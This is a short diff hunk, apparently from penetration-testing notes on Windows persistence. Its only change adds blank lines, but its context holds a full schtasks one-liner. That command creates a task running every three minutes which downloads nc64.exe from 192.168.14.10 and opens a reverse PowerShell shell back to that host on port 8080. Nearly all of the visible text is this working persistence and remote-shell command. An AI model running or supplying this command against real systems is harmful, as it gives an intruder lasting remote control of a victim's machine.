@@ -17,3 +17,5 @@ To create a scheduled task that runs every 3 minutes, as current user, downloads
 ```powershell
 schtasks /create /tn "Payback1" /sc minute /mo 3 /tr "powershell.exe -c wget http://192.168.14.10/nc64.exe -o C:\users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.14.10 8080 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 ```
+
+
